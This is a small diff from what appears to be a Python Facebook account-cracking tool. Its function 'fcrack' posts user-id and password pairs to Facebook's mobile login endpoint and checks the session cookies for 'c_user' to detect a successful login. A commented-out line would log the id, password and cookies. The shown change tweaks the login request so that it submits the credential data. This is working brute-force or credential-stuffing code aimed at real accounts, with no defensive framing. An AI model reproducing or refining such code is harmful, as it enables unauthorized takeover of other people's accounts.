@@ -1498,7 +1498,7 @@ def fcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
 
             'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/?next&ref=wizard&fl&login_from_aymh=1&refid=8',cookies=cookies,headers=headers).text
+            lo = session.post('https://m.facebook.com/login/?next&ref=wizard&fl&login_from_aymh=1&refid=8',data=idpass,allow_redirects=False,headers=head).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
